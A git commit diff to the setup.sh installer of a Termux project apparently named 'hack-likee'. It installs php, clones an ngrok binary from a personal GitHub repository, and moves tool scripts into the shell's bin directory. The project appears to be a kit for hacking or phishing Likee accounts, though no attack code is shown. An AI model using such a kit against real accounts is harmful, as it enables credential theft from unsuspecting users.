55714f1648914d674aa87c1ddc2c663d9425cef0
Fazle Rabbi <71178740+fh-rabbi@users.noreply.github.com>
2021-01-12 17:24:25 +0600

    Update setup.sh

--- setup.sh
+++ setup.sh
@@ -2,11 +2,18 @@ clear
 sleep 1.0
 pkg install php -y
 cd $HOME
+rm ngrok
+rm -rf ngrok
+rm ng
+rm -rf ng
 git clone https://github.com/fh-rabbi/ngrok
 cd $HOME
+mv ngrok ng
+cd ng
+mv ngrok $HOME
+cd $HOME
+rm -rf ng
 chmod +x ngrok
-rm LICENSE
-rm README.md
 cd $HOME/hack-likee
 mv pw /data/data/com.termux/files/usr/bin
 mv start-hl /data/data/com.termux/files/usr/bin
